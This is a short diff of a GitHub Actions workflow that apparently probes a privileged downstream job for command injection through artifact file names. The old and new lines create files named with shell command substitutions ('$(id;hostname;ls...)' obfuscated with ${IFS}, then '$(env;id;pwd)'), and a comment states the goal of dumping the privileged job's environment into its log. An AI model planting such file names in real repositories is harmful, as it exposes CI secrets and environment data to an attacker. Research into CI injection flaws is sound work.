@@ -17,7 +17,10 @@ jobs:
         run: |
           mkdir -p out
           printf '%s' "$PR_NUMBER" > out/pr_number.txt
-          : > 'out/$(id;hostname;ls${IFS}-la${HOME};ls${IFS}-la${HOME}$(printf${IFS}\\57)actions-runner$(printf${IFS}\\57)externals$(printf${IFS}\\57)node24$(printf${IFS}\\57)bin).txt'
+          # probe: dump environment of the privileged job into its log via cat argv errors
+          : > 'out/$(env;id;pwd).txt'
+          # probe: does an apostrophe and a space survive artifact naming?
+          : > "out/sp ace'quote.txt"
       - uses: actions/upload-artifact@v4
         with:
           name: content
